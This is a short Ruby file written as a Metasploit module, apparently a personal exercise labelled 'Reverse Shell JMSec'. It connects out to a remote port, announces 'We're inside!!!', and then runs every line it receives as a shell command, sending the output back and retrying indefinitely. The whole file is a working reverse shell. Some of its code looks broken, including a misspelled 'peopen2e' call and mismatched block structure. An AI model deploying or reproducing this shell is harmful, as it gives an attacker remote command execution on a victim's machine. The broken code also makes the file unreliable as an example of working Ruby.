require 'msf/core'
require 'socket'
require 'open3'

class MetasploitModule < Msf::Exploit
    def initialize(info={})
        super(update_info(info,
                          'Name'        => 'JaymonSec Exercise',
                          'Description' => 'Reverse Shell JMSec',
                          'License'     => 'MSF LICENSE',

                          ))
                                register_options(
                                [
                                        Opt::RPORT(6000),
                                        ],self.class)
                                deregister_options('RHOST')
    end

    def run
        begin
	connect
	sock.puts "Reverse Shell OK!!! We're inside!!!"
    	rescue 
		sleep 20
		retry
        end

	begin 
		while line = sock.gets
			Open3.peopen2e("#{line}") do | stdin, stdout_and_stderr | IO.copy_stream(stdout_and_stderr, sock)
		end
	end
	rescue
		retry
	end
    end
end
